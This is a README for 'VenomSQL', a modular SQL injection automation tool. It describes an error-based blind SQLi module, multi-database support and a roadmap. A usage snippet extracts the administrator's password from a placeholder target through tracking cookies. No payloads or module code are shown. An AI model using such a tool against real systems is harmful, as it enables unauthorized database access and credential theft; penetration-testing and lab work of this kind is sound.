# VenomSQL

Modular SQL injection automation tool.

## Features

- **Modular architecture** — each SQLi technique is a separate module
- **Multi-DB support** — Oracle, MySQL, PostgreSQL, MSSQL, SQLite, MariaDB
- **Blind SQLi (Error-based)** — extracts data character by character using conditional errors

## Project Structure

```
VenomSQL/
├── main.py          # BaseSQLi — base class for all techniques
├── dbConfig.py      # Database-specific syntax configurations
├── blindError.py    # Blind SQLi (error-based) module
└── .gitignore
```

## Usage

```python
from blindError import BlindErrorBased

cookie = {"TrackingId": "abc123", "session": "xyz789"}
sqli = BlindErrorBased(url="https://target.com", cookie=cookie, targetTable="users", db_type="oracle")
sqli.extract(column="password", username="administrator")
print(sqli.found_password)
```

## Roadmap

- [ ] Blind SQLi (Boolean-based)
- [ ] UNION-based SQLi
- [ ] Time-based Blind SQLi
- [ ] Auto-detect DB type
- [ ] CLI interface
